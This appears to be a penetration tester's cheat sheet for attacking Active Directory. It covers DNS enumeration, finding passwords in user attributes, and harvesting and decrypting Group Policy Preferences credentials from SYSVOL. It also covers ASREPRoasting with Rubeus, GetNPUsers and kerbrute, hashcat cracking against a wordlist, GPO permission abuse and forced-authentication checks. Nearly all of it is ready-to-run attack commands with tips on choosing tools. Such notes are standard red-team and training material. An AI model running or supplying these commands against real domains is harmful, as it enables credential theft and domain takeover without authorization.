## ADIDNS Enumeration

**When to use** Non-descriptive hostnaming conventions (e.g., SRV01934) prevent identification of high-value targets and require mapping DNS records via a valid domain user.

Enumerate all records in the zone via LDAP to find hidden entries like Jenkins or staging servers

```
adidnsdump -u <DOMAIN>\<USERNAME> ldap://<TARGET_IP>
```

Force resolution of unknown records using A queries when entries return blank or question marks

```
adidnsdump -u <DOMAIN>\<USERNAME> ldap://<TARGET_IP> -r
```

**Tool comparison**

- **adidnsdump**
    - `adidnsdump -u <DOMAIN>\<USERNAME> ldap://<TARGET_IP>`
    - Prefer when needing a full CSV export of the DNS zone via LDAP.

**Gotchas** **Default LDAP queries** often fail to return all DNS results, making specialized tools necessary to resolve the full zone.

---

## Sensitive Data in AD Attributes

**When to use** Initial foothold or lateral movement required and standard enumeration of user objects is possible.

Hunt for passwords left in the Description or Notes fields of user objects

```
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

Identify accounts where the password complexity or length policy is not enforced

```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

**Dangerous / misconfigured settings**

- **PASSWD_NOTREQD**: Allows accounts to have a **blank password** if the domain policy permits.
- **Description field**: Frequently contains legacy credentials or "do not change" passwords for service accounts.

**Gotchas** **PASSWD_NOTREQD** does not guarantee a blank password, only that the system does not require one to be set.

---

## SYSVOL and GPP Credential Harvesting

**When to use** Authenticated access to the domain is established and credentials for local admins or legacy accounts are needed from shared configuration files.

Manually check for hardcoded credentials in VBScript or PowerShell scripts

```
ls \\<DC_IP>\SYSVOL\<DOMAIN>\scripts
cat \\<DC_IP>\SYSVOL\<DOMAIN>\scripts\<FILE_PATH>
```

Search for and decrypt passwords pushed via Group Policy Preferences

```
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M gpp_password
```

Locate Registry.xml to find cleartext autologon credentials

```
crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M gpp_autologin
```

Manual decryption of a retrieved cpassword string

```
gpp-decrypt <HASH>
```

**Dangerous / misconfigured settings**

- **MS14-025**: Prevents new GPP passwords but leaves existing **Groups.xml** files in SYSVOL.
- **Registry.xml**: Stores autologon credentials in **cleartext**; Microsoft has not patched this behavior.

**Gotchas** **Deleted GPP policies** may leave cached copies of XML files on local endpoints even if removed from SYSVOL.

---

## ASREPRoasting Enumeration

**When to use** Need for an initial foothold or offline password cracking targets without requiring an SPN.

Find accounts with Kerberos pre-authentication disabled using PowerView

```
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

---

## ASREPRoasting Execution

**When to use** Target accounts identified with `DONT_REQ_PREAUTH` and offline cracking infrastructure is available.

Request encrypted TGT for a specific user and format for Hashcat

```
.\Rubeus.exe asreproast /user:<USERNAME> /nowrap /format:hashcat
```

Perform user enumeration and automatically dump hashes for vulnerable accounts

```
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <FILE_PATH>
```

Retrieve hashes for a list of valid users without providing a password

```
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -no-pass -usersfile <FILE_PATH>
```

Execute offline dictionary attack against the retrieved hash

```
hashcat -m 18200 <FILE_PATH> /usr/share/wordlists/rockyou.txt
```

**Tool comparison**

- **Rubeus**
    - `asreproast /user:<USERNAME> /nowrap`
    - Prefer when operating from a domain-joined Windows host.
- **GetNPUsers.py**
    - `-no-pass -usersfile <FILE_PATH>`
    - Prefer when attacking from Linux or without domain context.
- **Kerbrute**
    - `userenum -d <DOMAIN>`
    - Prefer for simultaneous user discovery and roasting.

**Edge cases** **GenericWrite/GenericAll** permissions over a user object allow an attacker to manually disable pre-authentication to force a roastable state.

**Gotchas** **Account Lockout** is generally not a risk for the roast itself, but the success of the attack relies entirely on **password complexity**.

---

## GPO ACL Abuse

**When to use** Control of a domain user is established and lateral movement or persistence is needed via computer/user settings.

List all GPOs to identify high-value targets like "Service Accounts Policy" or "AutoLogon"

```
Get-DomainGPO | select displayname
```

Identify GPOs where the current user or Domain Users group has modification rights

```
$sid=Convert-NameToSid "<USERNAME>"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Find the readable name of a GPO using its GUID

```
Get-GPO -Guid <GUID>
```

**Dangerous / misconfigured settings**

- **WriteProperty/WriteDacl**: Grants ability to take **full control** of the GPO and push malicious settings.

> ⚠️ Gap: The source mentions **SharpGPOAbuse** can add users to local admins or create scheduled tasks but provides no command syntax.

**Gotchas** **Mass impact** is a risk; modifying a GPO linked to an OU with many computers will affect every host simultaneously.

---

## Forced Authentication and Relaying

**When to use** Need to escalate to Domain Admin or capture machine account hashes.

Check if a target is vulnerable to MS-RPRN forced authentication

```
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <TARGET_IP>
```

Redirect LDAP authentication from a misconfigured web console to a listener

```
nc -lvnp 389
```

**Dangerous / misconfigured settings**

- **Exchange Windows Permissions**: Group members can write **DACLs** to the domain object, leading to DCSync.
- **Print Spooler Service**: Enabled by default on Windows servers with **Desktop Experience**.

**Gotchas** **Relaying to LDAP** requires the target to not have LDAP signing or channel binding enforced.